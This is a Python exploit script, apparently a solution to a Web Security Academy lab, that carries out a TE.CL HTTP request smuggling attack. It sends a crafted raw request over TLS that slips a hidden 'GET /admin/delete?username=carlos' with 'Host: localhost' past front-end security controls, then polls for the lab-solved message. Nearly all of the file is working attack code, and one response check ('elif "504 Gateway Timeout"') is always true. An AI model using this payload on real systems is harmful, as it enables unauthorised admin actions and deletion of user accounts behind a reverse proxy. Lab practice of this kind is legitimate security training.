import sys
import requests
import ssl
import urllib3
import socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability"""

def TE_CL_BYPASS_SECURITY(target_host,target_port):

    """
    # Payload Explanation:
    # - This payload exploits the TE.CL vulnerability by smuggling a malicious backend request within a chunked-encoded request.
    # - Frontend uses "Transfer-Encoding: chunked" to parse the request, processing the chunks.
    # - Backend uses "Content-Length" to determine the size of the body, leading to desynchronization.
    # 
    # Payload Structure:
    # 1. The first chunk specifies a size of "50" in hexadecimal, followed by the malicious backend request.
    # 2. The backend request attempts to delete the user "carlos" via the admin panel.
    # 3. The "Host: localhost" header tricks the backend into treating this as an internal request.
    # 4. The "Content-Length: 6" header ensures the backend processes the request correctly.
    # 5. The final "0\r\n\r\n" chunk signals the end of the chunked request for the frontend.
    """

    te_cl_payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "50\r\n"
        "GET /admin/delete?username=carlos HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )
    try:
         # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
         #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((target_host,target_port)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                print('(+) Sending payload ..... ')
                securesock.sendall(te_cl_payload.encode("utf-8"))#sending the payload 
                response_smuggling=securesock.recv(4096)#recving data  
                #check if we have 200 OK response 
                print('(+) Checking response .... ')
                if "HTTP/1.1 200 OK" in response_smuggling.decode(errors="Ignore",encoding="utf-8"):
    #After sending the request, we received an admin forbidden message. Therefore, we will send for a second requeste to get a normal response to test its functionality.
                    for i in range(1,3):
                        response_normal=requests.post("https://"+target_host,verify=False)
                        if "Congratulations, you solved the lab!" in response_normal.text:
                            print("(+) Request smuggled successfully . ")
                            print('(+) Congratulations, you solved the lab .')
                            sys.exit()
                        else:
                            pass

                elif "504 Gateway Timeout":  #check if the host down or not 
                    print("(-) No response received from the server .")
                    sys.exit()
                else:
                    print('(-) Error !')

    except Exception as err:
        print(f'(-) {err} . ')

       

def main():

    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
        sys.exit(1)
    
    target_host=sys.argv[1]
    print(target_host)
    target_port=443
    TE_CL_BYPASS_SECURITY(target_host,target_port)



if __name__=="__main__":
    main()